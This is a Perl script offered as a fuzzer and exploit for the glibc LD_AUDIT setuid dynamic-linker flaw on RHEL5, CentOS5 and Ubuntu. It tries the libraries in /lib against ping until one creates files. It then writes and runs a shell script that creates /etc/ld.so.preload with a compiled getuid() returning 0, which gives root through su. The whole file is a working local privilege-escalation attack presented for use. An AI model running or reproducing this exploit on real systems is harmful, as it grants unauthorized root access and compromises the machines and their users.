#!/usr/bin/perl
use POSIX;
$ptxt="

 [The GNU C library dynamic linker will dlopen arbitrary DSOs during setuid loads]
 [desc: Fuzz and exploit for RHEL5 / CentOS5 / Ubuntu]

";
print $ptxt;
our $old_fh=select(STDOUT); $|=1; select($old_fh);
@libdirs=("/lib"); # you can add your own paths to lib folder here
$tempdir="/tmp/fuzz/"; # temp directory
mkdir($tempdir);

#make some ascii
$total=0;
foreach $libdir (@libdirs) {
                opendir(my $dir, $libdir);
                @lf = readdir($dir);
                closedir $dir;
                $total=$total+scalar(@lf)-2;
}
$step=ceil($total/50);
$stepp=0;
print "0%"." "x6 ."20%"." "x6 ."40%"." "x6 ."60%"." "x6 ."80%"." "x6 ."100%\n";
print "\[";
foreach $libdir (@libdirs) {
                opendir(my $dir, $libdir);
                @libfiles = readdir($dir);
                closedir $dir;
                foreach $libfile (@libfiles) {
			       $stepp++;
			       if ($stepp==$step) {print ".";$stepp=0;}
                               if (($libfile ne ".") && ($libfile ne "..")) {

                                               @dump=`strings $libdir\/$libfile`;
                                               foreach $dline (@dump) {
                                                               if ($dline=~/^([A-Z\_0-9]+)$/) {
                                                                              chomp($dline);
                                                                              $ccc=`LD_AUDIT="$libfile" $dline="$tempdir$libfile-$dline" ping&>/dev/null`;
                                                               }
                                               }
                               }
                }

}
print "\]\n";

print "Fuzzing done. Thank you for using!\n";

opendir(my $dir, $tempdir);
@fuzzList = readdir($dir);
closedir $dir;
$libToExploit="";$argToExploit="";
if (scalar(@fuzzList)>2) {
	foreach $fuzzFile (@fuzzList) {
		if ($fuzzFile ne "." && $fuzzFile ne "..") {
			my ($lib,$param)=$fuzzFile=~/(.*)-(.*)/;
			print "Success: vuln lib - $lib ; arg - $param\n";
			if ((-e "$tempdir$fuzzFile") && (!-d "$tempdir$fuzzFile")) {
				$libToExploit=$lib;
				$argToExploit=$param;
			}
		}
	}
} else {
	print "Fail. No vuln libs found. Try another target ;)\n";
	exit();
}

$shCode=qq(#!/bin/sh
umask 0
LD_AUDIT=EXP_LIBRARY EXP_ARGUMENT=/etc/ld.so.preload ping
echo "[+] creating /tmp/getuid.so"
echo "int getuid(){return 0;}" > /tmp/getuid.c
gcc -shared /tmp/getuid.c -o /tmp/getuid.so
echo "/tmp/getuid.so" > /etc/ld.so.preload
);

if ($libToExploit ne "" && $argToExploit ne "") {
	$shCode=~s/EXP_LIBRARY/$libToExploit/gi;
	$shCode=~s/EXP_ARGUMENT/$argToExploit/gi;
	open(SH,">spl.sh");
	print SH $shCode;
	close(SH);
	chmod(0755,"spl.sh");
	system("./spl.sh");
	print "Hehe.. Type 'su' and be awesome!\n";
}